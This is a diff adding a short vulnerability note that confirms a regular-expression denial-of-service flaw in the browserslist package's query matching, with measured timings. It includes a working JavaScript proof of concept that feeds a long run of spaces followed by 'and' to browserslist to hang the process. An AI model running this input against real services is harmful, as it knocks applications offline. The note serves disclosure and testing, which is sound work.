@@ -1,0 +1,17 @@
+Confirmed: the ReDoS is in browserslist's `doMatch`/`find` chain (the `.match()` call at index.js), with quadratic blowup verified locally (50k spaces → 2.8s, 100k spaces → 11.1s).
+
+```javascript
+// Denial of Service in browserslist's query matching (doMatch/find -> String.prototype.match)
+// A crafted query string causes quadratic-time regex matching, hanging the process.
+const browserslist = require("./node_modules/browserslist");
+
+const malicious = " ".repeat(100000) + "and";
+
+console.time("browserslist-redos");
+try {
+  browserslist(malicious);
+} catch (e) {
+  // parsing still completes only after the expensive quadratic scan
+}
+console.timeEnd("browserslist-redos");
+```
